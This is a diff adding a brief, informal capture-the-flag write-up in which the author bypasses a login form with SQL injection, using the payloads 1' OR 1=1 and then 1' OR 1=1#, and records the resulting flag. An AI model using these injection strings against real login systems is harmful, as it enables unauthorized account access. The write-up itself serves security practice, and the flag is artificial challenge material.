@@ -1,0 +1,17 @@
+let's see
+asked me to enter username & password let's try a ver common playload 
+user :  1' OR 1=1
+pass : **** "any thing" 
+
+Error Message
+You have an error in your SQL syntax; 
+check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = '*******' at line 1
+
+ lol ^^ we know now that any sql query will run but all need now to escape the next query " And password " 
+ 
+ let's try escape #  
+ user : 1' OR 1=1#
+ password : ***** 
+ 
+ wow Falg appear Solved (Y)  
+ flag :FLAG-238974289383274893
